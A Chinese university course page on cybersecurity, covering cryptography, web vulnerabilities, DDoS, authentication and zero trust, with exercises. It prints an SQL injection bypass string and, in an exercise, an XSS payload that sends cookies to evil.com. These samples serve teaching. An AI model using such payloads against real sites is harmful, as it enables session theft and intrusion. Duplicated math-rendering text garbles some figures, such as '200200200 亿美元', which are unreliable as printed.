大学计算机科学与技术 — 网络安全

知识要点

网络安全（Cybersecurity）是保护计算机系统、网络和数据免受未经授权的访问、破坏或窃取的学科。随着社会的全面数字化，网络安全已从纯技术问题上升为国家安全和企业生存的核心议题。2020 年代，勒索软件攻击造成的全球损失每年超过 200200200 亿美元，供应链攻击（如 SolarWinds 事件）展示了即使是最高安全等级的组织也可能被入侵。

网络安全的核心目标被概括为 CIA 三元组：机密性（Confidentiality）——确保信息仅对授权方可见；完整性（Integrity）——确保信息不被未授权修改；可用性（Availability）——确保授权用户在需要时能访问信息和资源。围绕这三个目标展开的攻防对抗，构成了网络安全的全部内容。

安全领域 核心关注 关键技术 典型威胁
密码学 数据机密性与完整性 对称加密、公钥加密、哈希 密码分析、量子威胁
网络安全 通信安全与边界防护 防火墙、IDS/IPS、TLS DDoS、中间人攻击
应用安全 软件漏洞防护 安全编码、渗透测试、WAF 注入攻击、XSS、CSRF
身份与访问管理 认证与授权 多因素认证、OAuth、零信任 凭证窃取、权限提升
运营安全 检测、响应与恢复 SIEM、SOC、事件响应 APT、内部威胁

详细讲解

密码学基础

密码学是网络安全的数学基石。现代密码学的安全性基于计算困难性假设——攻击者在合理时间和算力下无法破解加密。

对称加密使用同一密钥 KKK 进行加密和解密：EK(M)=CE_K(M) = CEK​(M)=C，DK(C)=MD_K(C) = MDK​(C)=M。

算法 类型 密钥长度 块大小 安全状态
AES 块密码 128/192/256 位 128 位 当前标准，安全
ChaCha20 流密码 256 位 — TLS 1.3 推荐，安全
DES 块密码 56 位 64 位 已淘汰（暴力破解可行）
3DES 块密码 168 位有效 64 位 逐步淘汰

AES 在 GCM 模式（Galois/Counter Mode）下同时提供加密和认证（AEAD），是当前最推荐的对称加密方案。GCM 的认证标签通过有限域 GF(2128)GF(2^{128})GF(2128) 上的多项式乘法计算，能检测密文的任何篡改。

公钥加密使用一对密钥——公钥 pkpkpk 加密，私钥 sksksk 解密。RSA 的安全性基于大整数分解困难：

c=me mod n,m=cd mod nc = m^e \bmod n, \quad m = c^d \bmod nc=memodn,m=cdmodn

其中 n=pqn = pqn=pq（p,qp, qp,q 为大素数），e⋅d≡1(modϕ(n))e \cdot d \equiv 1 \pmod{\phi(n)}e⋅d≡1(modϕ(n))。知道 nnn 但不知道 p,qp, qp,q 时，无法高效计算 ddd。当前推荐密钥长度 ≥2048\geq 2048≥2048 位。

椭圆曲线密码学（ECC）基于椭圆曲线离散对数问题，在相同安全级别下密钥长度远短于 RSA（256 位 ECC ≈\approx≈ 3072 位 RSA），计算效率更高。Curve25519 是广泛使用的椭圆曲线，用于 TLS、Signal 协议和 WireGuard VPN。

  • 抗碰撞性：无法找到任意 m1≠m2m_1 \neq m_2m1​=m2​ 使得 H(m1)=H(m2)H(m_1) = H(m_2)H(m1​)=H(m2​)

SHA-256 输出 256 位摘要，生日攻击需要约 21282^{128}2128 次哈希运算才能找到碰撞。SHA-1（160 位）已被 Google 团队在 2017 年实际碰撞（SHAttered 攻击），不应再用于安全场景。

Web 应用安全

Web 应用是最常见的攻击面。OWASP Top 10 列出了最关键的 Web 安全风险：

SQL 注入（SQLi）：攻击者在输入中嵌入 SQL 代码，当应用使用字符串拼接构造查询时，恶意输入被当作 SQL 执行。例如输入 ' OR '1'='1 可绕过登录验证。防御手段：参数化查询（Prepared Statement）将数据和代码分离，从根本上杜绝注入。

跨站脚本（XSS）：攻击者在 Web 页面中注入恶意 JavaScript 代码，当其他用户浏览该页面时代码自动执行，可以窃取 Cookie、会话令牌等。分为存储型（恶意脚本存入数据库）、反射型（通过 URL 参数触发）和 DOM 型（客户端 JavaScript 操作不当）。防御：输出编码（HTML Entity Encoding）和 Content Security Policy（CSP）头。

跨站请求伪造（CSRF）：利用用户已认证的会话，诱使用户浏览器向目标网站发送伪造请求。防御：CSRF Token（在表单中嵌入随机令牌并在服务端验证）和 SameSite Cookie 属性。

网络攻击与防御

分布式拒绝服务（DDoS）攻击通过大量恶意流量淹没目标服务器，使其无法为正常用户提供服务。攻击类型包括：

  • Volume-based：UDP 洪泛、DNS 放大。DNS 放大攻击的放大系数可达 50-70×50\text{-}70\times50-70×——攻击者发送伪造源 IP 的小 DNS 查询，权威服务器向受害者返回大量响应。
  • Protocol-based：SYN 洪泛（利用 TCP 三次握手的半开连接占满服务器资源）
  • Application-layer：HTTP 洪泛、Slowloris（缓慢发送 HTTP 请求头，占用连接不释放）

防御措施包括：CDN 分流、速率限制、SYN Cookie（无状态处理 SYN 请求）和 BGP 流量清洗。

中间人攻击（MitM）：攻击者在通信双方之间截获和可能修改数据。TLS/HTTPS 通过证书认证和密钥协商防止 MitM——浏览器验证服务器证书是否由受信任的 CA 签发，HSTS（HTTP Strict Transport Security）强制使用 HTTPS。

认证与访问控制

认证（Authentication）验证"你是谁"，授权（Authorization）决定"你能做什么"。

密码安全：密码不应以明文存储，而应使用慢哈希函数（如 bcrypt、Argon2）加盐存储。bcrypt 的计算代价参数（cost factor）使得暴力破解成本极高：

bcrypt(salt,password,cost)→hash\text{bcrypt}(\text{salt}, \text{password}, \text{cost}) \to \text{hash}bcrypt(salt,password,cost)→hash

当 cost =12= 12=12 时，单次哈希约需 250  ms250\;\text{ms}250ms，使得彩虹表和在线暴力破解均不可行。

多因素认证（MFA）要求至少两类认证因素：

  • 知识因素：密码、PIN
  • 持有因素：手机（OTP）、硬件密钥（YubiKey）
  • 生物特征：指纹、面部识别

零信任架构（Zero Trust）的核心原则是"永远不信任，始终验证"。与传统的边界安全模型（内网可信、外网不可信）不同，零信任假设网络已被渗透，对每次访问请求都进行身份验证、设备检查和最小权限授权。BeyondCorp（Google）是零信任架构的先驱实践。

安全开发生命周期

将安全融入软件开发的全过程（Shift Left Security）：

  • 需求阶段：威胁建模（STRIDE 模型）识别潜在攻击面
  • 设计阶段：安全架构审查，最小权限原则
  • 编码阶段：安全编码规范，静态分析（SAST）工具扫描
  • 测试阶段：动态分析（DAST）、渗透测试、模糊测试（Fuzzing）
  • 部署阶段：容器镜像扫描、依赖漏洞检查（SCA）
  • 运营阶段：日志监控、入侵检测（IDS）、事件响应

模糊测试通过向程序输入大量随机或半随机数据来发现崩溃和漏洞。AFL（American Fuzzy Lop）是最知名的覆盖引导模糊器，通过代码覆盖率反馈指导输入变异，已在 OpenSSL、SQLite 等关键软件中发现数百个漏洞。

练习与思考

  1. 解释 AES-GCM 和 AES-CBC 在安全性上的差异。为什么 CBC 模式需要额外的 MAC（如 HMAC）来保证完整性，而 GCM 不需要？什么是 Padding Oracle 攻击？

  2. 给定一个 Web 应用的登录接口，其后端 SQL 查询为 SELECT * FROM users WHERE username='$input' AND password='$pass'。构造一个 SQL 注入 payload 使其绕过认证。然后说明参数化查询如何防止此攻击。

  3. 某网站允许用户在评论中输入 HTML。攻击者提交了 <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>。(a) 这属于哪种类型的 XSS？(b) 列举三种防御措施并说明各自的防护层面。

  4. 比较 RSA-2048 和 Curve25519 在密钥长度、计算性能和抗量子计算能力方面的差异。为什么 NIST 正在推进后量子密码标准化？Kyber 和 Dilithium 分别解决什么问题？

  5. 设计一个简化的零信任访问控制流程：员工从个人笔记本电脑通过咖啡店 Wi-Fi 访问公司内部代码仓库。需要经过哪些验证步骤？与传统 VPN 方案相比有什么优势？

拓展阅读

  • 《Computer Security: Principles and Practice》（Stallings & Brown）：网络安全领域的经典教材，覆盖密码学、网络安全、软件安全和管理安全。
  • 《Cryptography and Network Security》（William Stallings）：密码学专项教材，从古典密码到现代公钥体系再到量子密码学。
  • OWASP Web Security Testing Guide（owasp.org）：Web 应用安全测试的权威指南，包含详细的测试方法和工具推荐。
  • CTF（Capture The Flag）竞赛平台：picoCTF（入门）、Hack The Box（进阶）是实践网络安全技能的最佳平台。

小结

网络安全是一场持续的攻防对抗。密码学提供了机密性和完整性的数学保障，Web 应用安全关注代码级漏洞的消除，网络安全防御抵御从 DDoS 到中间人攻击的各类威胁，身份与访问管理确保只有正确的人能访问正确的资源。零信任架构代表了安全理念的范式转变——从基于边界的信任到基于持续验证的信任。安全不是一次性的产品，而是贯穿软件全生命周期的持续过程。对于计算机科学学习者，具备安全意识和基本的攻防知识，是编写可靠软件和构建安全系统的必备素养。
